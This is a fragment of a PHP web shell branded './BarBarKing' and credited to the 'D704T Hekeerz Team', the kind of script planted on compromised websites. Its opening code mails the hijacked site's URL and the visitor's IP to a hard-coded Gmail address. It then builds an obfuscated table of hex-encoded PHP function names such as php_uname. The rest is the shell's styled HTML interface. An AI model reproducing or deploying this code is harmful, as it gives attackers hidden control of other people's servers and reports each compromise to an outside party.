...
$to = 'ressultku2612@gmail.com';
$path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($to, "Login Succes | Jay Maranatha Hutajulu", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
define("Yp", "root@./barbarking");
$G3 = "scandir";
$c8 = [
    "7068705f756e616d65",
...
<body>
 <div class="border">
   <div class="d-flex">
  <a class="border social-icon" data-tooltip="Email" href="mailto:ressultku2612@gmail">
    <i class="fa fa-envelope" aria-hidden="true" style="font-size: 17px;"></i>
  </a>&nbsp;
  <a class="border social-icon" data-tooltip="Facebook" href="https://www.facebook.com/XaveriousOfficial">
    <i class="fa fa-facebook" aria-hidden="true" style="font-size: 17px;"></i>
  </a>&nbsp;
      <div class="barbarking">
       <a href="?" style="font-size:25px;font-family: 'SciFi';">
       <?= Yp ?>
       </a>&nbsp;
      </div>
         <a class="border social-icon" data-tooltip="WhatsApp" href="https://wa.me/">
    <i class="fa fa-whatsapp" aria-hidden="true" style="font-size: 20px;"></i>
  </a>&nbsp;
  <a class="border social-icon" data-tooltip="Telegram" href="https://t.me/">
...
<font color="lime">Copyright © 2022 </font> <font color="deeppink">./BarBarKing</font> <font color="lime">. Powered by</font> <font color="deeppink">D704T Hekeerz Team</font>
</div></br>
